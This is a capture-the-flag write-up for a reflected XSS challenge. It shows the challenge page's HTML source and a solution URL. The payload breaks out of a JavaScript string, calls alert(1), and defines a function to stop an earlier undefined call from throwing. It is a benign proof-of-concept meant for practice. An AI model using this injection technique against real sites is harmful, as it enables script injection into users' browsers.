Description: Can you alert(1) this page (in firefox)?

Source:

```html
<!DOCTYPE html>
<html>
<head>
  <title>XSS1</title>
  <link rel="stylesheet" href="/custom.css" />
</head>
<body>
  <main id="main">
    <p>Can you alert(1) <a href="?xss=stuff">this page</a> (in firefox)?</p>

    <p>Send your XSS link for flag here:</p>
    <form method="post" action="contact.php">
      <input type="text" name="url" value="" placeholder="http://xss1.sect.ctf.rocks/?xss=">
      <input type="submit" name="submit" value="Send">
    </form>
  </main>
</body>
</html>
<script>
dontrunthisscript();
var a = "stuff";
</script>
```

Solution:

```
http://xss1.sect.ctf.rocks/?xss=stuff%22;alert(1);function%20dontrunthisscript(){};//
```
